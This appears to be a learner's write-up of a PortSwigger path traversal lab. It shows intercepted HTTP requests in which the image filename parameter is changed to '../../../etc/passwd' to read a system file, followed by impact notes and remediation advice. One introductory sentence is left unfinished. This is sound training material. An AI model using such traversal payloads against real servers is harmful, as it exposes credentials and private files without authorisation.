# Server Side Vulnerabilities - Path Traversal

Date: 11/08/2025

URL: https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/path-traversal-apprentice/file-path-traversal/what-is-path-traversal

Lab URL: https://0ad40060044768f580581c7d003a00db.web-security-academy.net/

Environment: Portswigger Web Security Academy - Path Traversal Lab, Burp Suite Community Edition (proxy & browser)

## Summary

As part of my introduction to cyber security and pentesting, I'll be learning Burp Suite. I've installed the 
Community Edition and am going through the web security academy.

The first vulnerability I learned about was path traversal, where you can read (or even write!) arbitrary server files that the developer or admin did not intend to be public. This is done by requesting a URL on an insecure web server that points to an unintended path. For example, instead of 

```
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```

## Objectives

The lab presents a shopping website with the objective of retrieving the contents of /etc/passwd. 

## Exploitation Steps

I first began intercepting HTTP traffic with Burp's proxy. I grabbed the first GET request for an image:

```
GET /image?filename=72.jpg HTTP/2
Host: 0ad40060044768f580581c7d003a00db.web-security-academy.net
Cookie: <redacted>
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0ad40060044768f580581c7d003a00db.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=2, i
```

Before forwarding the request to the server, I modified the filename:

```
GET /image?filename=../../../etc/passwd HTTP/2
Host: 0ad40060044768f580581c7d003a00db.web-security-academy.net
Cookie: <redacted>
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0ad40060044768f580581c7d003a00db.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=2, i
```

We can see doing so sends a WebSocket response to the client containing some HTML that modifies the lab banner on the site to show the lab is solved and a congratulatory pop-up.

<img width="942" height="716" alt="path-traversal-complete" src="https://github.com/user-attachments/assets/3736ec61-c018-4317-b07d-604ea7c8dd0c" />

## Impact

Successful exploitation allows an attacker to read or write arbitrary files in the server's file system. This could expose sensitive credentials, code, and data depending upon the file structure and permissions present, resulting in a medium to high severity. 

## Remediation

According to [Portswigger](https://portswigger.net/web-security/file-path-traversal), to defend against path traversal attacks, there are two methods available. The first one being to avoid passing user-supplied input to filesystem APIs altogether. 

In the event this isn't possible, there are two layers of defense that can be used to prevent these attacks:

* Validate the user input before processing it. Ideally, compare the user input with a whitelist of permitted values. If that isn't possible, verify that the input contains only permitted content, such as alphanumeric characters only.
* After validating the supplied input, append the input to the base directory and use a platform filesystem API to canonicalize the path. Verify that the canonicalized path starts with the expected base directory.

This lab emphasized the importance of sanitizing inputs and secure file handling practices in web applications. 
